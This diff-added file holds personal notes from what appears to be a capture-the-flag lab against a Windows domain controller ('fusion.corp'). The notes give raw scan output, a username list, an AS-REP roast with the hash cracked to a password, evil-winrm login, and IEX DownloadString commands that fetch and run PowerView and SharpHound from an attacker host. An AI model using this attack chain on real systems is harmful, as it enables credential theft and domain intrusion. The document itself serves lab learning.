@@ -1,0 +1,288 @@
+Jhon Mickel
+Andrew Arnold
+Lellien Linda
+Jhon Powel
+fleming
+boby
+
+
+
+┌──(root💀kali)-[~]
+└─# nmap -A -sC -sV 10.10.183.194
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-04 09:46 IST
+Stats: 0:00:37 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
+SYN Stealth Scan Timing: About 99.99% done; ETC: 09:46 (0:00:00 remaining)
+Stats: 0:01:31 elapsed; 0 hosts completed (1 up), 1 undergoing Traceroute
+Traceroute Timing: About 32.26% done; ETC: 09:47 (0:00:00 remaining)
+Nmap scan report for 10.10.183.194
+Host is up (0.63s latency).
+Not shown: 987 filtered tcp ports (no-response)
+PORT     STATE SERVICE       VERSION
+53/tcp   open  domain        Simple DNS Plus
+80/tcp   open  http          Microsoft IIS httpd 10.0
+|_http-title: eBusiness Bootstrap Template
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-03-04 04:16:49Z)
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: fusion.corp0., Site: Default-First-Site-Name)
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  tcpwrapped
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: fusion.corp0., Site: Default-First-Site-Name)
+3269/tcp open  tcpwrapped
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+|_ssl-date: 2022-03-04T04:18:25+00:00; -16s from scanner time.
+| ssl-cert: Subject: commonName=Fusion-DC.fusion.corp
+| Not valid before: 2022-03-03T04:15:45
+|_Not valid after:  2022-09-02T04:15:45
+| rdp-ntlm-info: 
+|   Target_Name: FUSION
+|   NetBIOS_Domain_Name: FUSION
+|   NetBIOS_Computer_Name: FUSION-DC
+|   DNS_Domain_Name: fusion.corp
+|   DNS_Computer_Name: Fusion-DC.fusion.corp
+|   Product_Version: 10.0.17763
+|_  System_Time: 2022-03-04T04:17:46+00:00
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
+No OS matches for host
+Network Distance: 4 hops
+Service Info: Host: FUSION-DC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   date: 2022-03-04T04:17:46
+|_  start_date: N/A
+|_clock-skew: mean: -16s, deviation: 0s, median: -16s
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled and required
+
+TRACEROUTE (using port 135/tcp)
+HOP RTT       ADDRESS
+1   353.92 ms 10.4.0.1
+2   ... 3
+4   661.27 ms 10.10.183.194
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 159.96 seconds
+
+
+
+
+
+
+
+
+dirb http://10.10.183.194                                                       1 ⨯
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Fri Mar  4 09:47:26 2022
+URL_BASE: http://10.10.183.194/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612                                                          
+
+---- Scanning URL: http://10.10.183.194/ ----
+==> DIRECTORY: http://10.10.183.194/backup/                                            
+==> DIRECTORY: http://10.10.183.194/css/                                               
+==> DIRECTORY: http://10.10.183.194/img/                                               
++ http://10.10.183.194/index.html (CODE:200|SIZE:53888)                                
+==> DIRECTORY: http://10.10.183.194/js/                                                
+==> DIRECTORY: http://10.10.183.194/lib/                                               
+                                                                                       
+---- Entering directory: http://10.10.183.194/backup/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                                       
+---- Entering directory: http://10.10.183.194/css/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                                       
+---- Entering directory: http://10.10.183.194/img/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                                       
+---- Entering directory: http://10.10.183.194/js/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                                       
+---- Entering directory: http://10.10.183.194/lib/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                               
+-----------------
+END_TIME: Fri Mar  4 10:35:35
+                                                           
+                                                           
+                                                           
+                                                           
+                                                           
+                                                           
+/backups  --    employee.ods      
+
+Name	                 Username
+Jhon Mickel	         jmickel
+Andrew Arnold	         aarnold
+Lellien Linda	         llinda
+Jhon Powel	         jpowel
+Dominique Vroslav	 dvroslav
+Thomas Jeffersonn	 tjefferson
+Nola Maurin	         nmaurin
+Mira Ladovic	         mladovic
+Larry Parker	         lparker
+Kay Garland 	         kgarland
+Diana Pertersen	         dpertersen
+
+
+
+
+
+
+
+ python3 kerbrute.py -domain fusion.corp -dc-ip 10.10.213.192 -users /home/golum/usernm
+Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
+
+[*] Valid user => lparker [NOT PREAUTH]
+[*] No passwords were discovered :'(
+                                 
+
+                                                                                        
+┌──(root💀kali)-[~/kerbrute]
+└─# /usr/share/doc/python3-impacket/examples/GetNPUsers.py -usersfile /home/golum/usernm -no-pass -request fusion.corp/
+Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
+
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+$krb5asrep$23$lparker@FUSION.CORP:35491bf02a5d4c061dd7a30016c9f706$50e917301830779fd0ec9543f38f966bb548827f07a713f420193dbc1f05bf895113fcfc1e7228c9a93b924d1f8894f2253052e70ce38d16cd9b8d459d9145da8f6d5132e7bbec0feb29b212ee99e76f52b354ce3c151561bc188abab72c62b0f9ced6ab91b3d47a605ac15ec49bd617f340d638ada7f2a6f70d3e72e02cf5b9d85dd45b7d0105f3d01dbd83d96c2721b0f104d1452829b2c7f44380b26a44783815fbf7310cc100e7c240d76f871128d8a5d398b339d66c6a949134e96648ff18c46881cef9582bb9ae56d18c90382c8022506ff3f8e31b9adb695716a705a5f35f82f4bc0065ff9187
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+                                                                                        
+                                                                                        
+                                                                                        
+                                                                                                                                                                                
+┌──(root💀kali)-[~]
+└─# hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt
+hashcat (v6.2.5) starting
+
+OpenCL API (OpenCL 2.0 pocl 1.8  Linux, None+Asserts, RELOC, LLVM 11.1.0, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+=====================================================================================================================================
+* Device #1: pthread-Intel(R) Core(TM) i5-8250U CPU @ 1.60GHz, 2863/5790 MB (1024 MB allocatable), 8MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Optimizers applied:
+* Zero-Byte
+* Not-Iterated
+* Single-Hash
+* Single-Salt
+
+ATTENTION! Pure (unoptimized) backend kernels selected.
+Pure kernels can crack longer passwords, but drastically reduce performance.
+If you want to switch to optimized kernels, append -O to your commandline.
+See the above message to find out about the exact limits.
+
+Watchdog: Temperature abort trigger set to 90c
+
+Host memory required for this attack: 2 MB
+
+Dictionary cache hit:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344385
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+
+$krb5asrep$23$lparker@FUSION.CORP:35491bf02a5d4c061dd7a30016c9f706$50e917301830779fd0ec9543f38f966bb548827f07a713f420193dbc1f05bf895113fcfc1e7228c9a93b924d1f8894f2253052e70ce38d16cd9b8d459d9145da8f6d5132e7bbec0feb29b212ee99e76f52b354ce3c151561bc188abab72c62b0f9ced6ab91b3d47a605ac15ec49bd617f340d638ada7f2a6f70d3e72e02cf5b9d85dd45b7d0105f3d01dbd83d96c2721b0f104d1452829b2c7f44380b26a44783815fbf7310cc100e7c240d76f871128d8a5d398b339d66c6a949134e96648ff18c46881cef9582bb9ae56d18c90382c8022506ff3f8e31b9adb695716a705a5f35f82f4bc0065ff9187:!!abbylvzsvs2k6!
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
+Hash.Target......: $krb5asrep$23$lparker@FUSION.CORP:35491bf02a5d4c061...ff9187
+Time.Started.....: Fri Mar  4 11:57:09 2022 (2 secs)
+Time.Estimated...: Fri Mar  4 11:57:11 2022 (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:  1940.3 kH/s (1.28ms) @ Accel:512 Loops:1 Thr:1 Vec:8
+Recovered........: 1/1 (100.00%) Digests
+Progress.........: 2461696/14344385 (17.16%)
+Rejected.........: 0/2461696 (0.00%)
+Restore.Point....: 2457600/14344385 (17.13%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidate.Engine.: Device Generator
+Candidates.#1....: **miranda -> หรเสำไร
+Hardware.Mon.#1..: Temp: 62c Util: 66%
+
+Started: Fri Mar  4 11:56:30 2022
+Stopped: Fri Mar  4 11:57:12 2022
+
+
+get evil winrm shell
+
+
+
+using evil winrm
+Basic commands
+
+    upload: local files can be auto-completed using tab key. It is not needed to put a remote_path if the local file is in the same directory as evil-winrm.rb file.
+        usage: upload local_path remote_path
+    download: it is not needed to set local_path if the remote file is in the current directory.
+        usage: download remote_path local_path
+    services: list all services. No administrator permissions needed.
+    menu: load the Invoke-Binary and l04d3r-LoadDll functions that we will explain below. When a ps1 is loaded all its functions will be shown up.
+
+Load powershell scripts
+
+    To load a ps1 file you just have to type the name (auto-completion usnig tab allowed). The scripts must be in the path set at -s argument. Type menu again and see the loaded functions.
+
+Advanced commands
+
+    Invoke-Binary: allows exes compiled from c# to be executed in memory. The name can be auto-completed using tab key and allows up to 3 parameters. The executables must be in the path set at -e argument.
+
+l04d3r-LoadDll: allows loading dll libraries in memory, it is equivalent to: [Reflection.Assembly]::Load([IO.File]::ReadAllBytes("pwn.dll"))
+
+The dll file can be hosted by smb, http or locally. Once it is loaded type menu, then it is possible to autocomplete all functions.
+
+Extra features
+
+    To disable colors just modify on code this variable $colors_enabled. Set it to false: $colors_enabled = false
+    
+    
+    
+    
+
+
+
+evil-winrm -i fusion.corp -u lparker -p '!!abbylvzsvs2k6!'
+
+
+*Evil-WinRM* PS C:\Users\lparker\Documents> IEX (New-Object Net.WebClient).DownloadString('http://10.4.58.116:8000/PowerView.ps1')
+*Evil-WinRM* PS C:\Users\lparker\Documents> IEX (New-Object Net.WebClient).DownloadString('http://10.4.58.116:8000/SharpHound.ps1')
+*Evil-WinRM* PS C:\Users\lparker\Documents> Invoke-BloodHound -CollectionMethod All -Zipfilename out.zip
+
+./SharpHound.exe --CollectionMethod All
+Invoke-BloodHound -CollectionMethod All
+
+be sure that you get same version of sharphound as bloodhound is 
+
